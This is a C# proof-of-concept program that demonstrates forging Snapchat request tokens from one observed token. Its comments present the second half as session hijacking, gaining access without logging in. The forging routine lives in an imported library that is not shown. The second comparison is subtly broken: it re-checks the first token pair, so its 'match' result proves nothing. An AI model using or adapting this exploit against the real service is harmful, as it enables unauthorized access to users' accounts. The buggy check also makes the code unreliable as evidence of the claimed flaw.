using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using SnapSnatcher;

namespace SnapchatSHExploitPOC
{
    class Program
    {
        static void Main(string[] args)
        {
            /*
             * Proof of concept of a Snapchat security exploit
             */

            //generate some random authToken (for testing purpose only, you'll need a real token to use the service)
            //lengt is not important, it gets hashed anyway
            string authToken = Guid.NewGuid().ToString();

            //create timestamp (included in POST data)
            string timestamp = SnapConnector.timestamp();
            Console.WriteLine("timestamp:\r\n{0}\r\n", timestamp);

            //get real request token (can be used to make real requests to Snapchat servers)
            string reqToken = SnapConnector.getReqToken(timestamp, authToken);
            Console.WriteLine("real request token:\r\n{0}\r\n", reqToken);

            //now use the first request token to forge a reqToken for the same timestamp for comparison
            string forgedToken = SnapConnector.forgeReqToken(timestamp, reqToken);
            Console.WriteLine("reforged request token:\r\n{0}\r\n", forgedToken);

            //now compare
            if (reqToken == forgedToken)
            {
                Console.WriteLine("Tokens match");
            }
            else
            {
                Console.WriteLine("Tokens do not match");
            }

            //not too exciting eh?
            //Then let's turn it the other way around:
            Console.ReadLine();

            timestamp = SnapConnector.timestamp();
            Console.WriteLine("new timestamp:\r\n{0}\r\n", timestamp);

            //First forge a req token for a new timestamp which we can use to make a new request (a.k.a. hijacking, gaining access without logging in)
            string forgedToken2 = SnapConnector.forgeReqToken(timestamp, reqToken);
            Console.WriteLine("new forged request token:\r\n{0}\r\n", forgedToken2);

            //now use the regular reqToken generation method to see if our forged token is valid
            string reqToken2 = SnapConnector.getReqToken(timestamp, authToken);
            Console.WriteLine("new real request token:\r\n{0}\r\n", reqToken2);

            //now compare again
            if (reqToken == forgedToken)
            {
                Console.WriteLine("Tokens match");
            }
            else
            {
                Console.WriteLine("Tokens do not match");
            }

            //pretty sloppy security indeed!
            Console.ReadLine();
        }
    }
}
